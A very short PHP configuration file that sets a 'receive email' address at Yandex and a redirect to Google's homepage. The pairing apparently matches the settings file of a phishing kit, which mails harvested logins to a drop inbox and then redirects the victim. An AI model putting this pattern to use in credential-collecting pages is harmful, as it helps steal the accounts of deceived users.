<?php 
$Receive_email="h-vergmace01@yandex.com";
$redirect="https://www.google.com/";
?>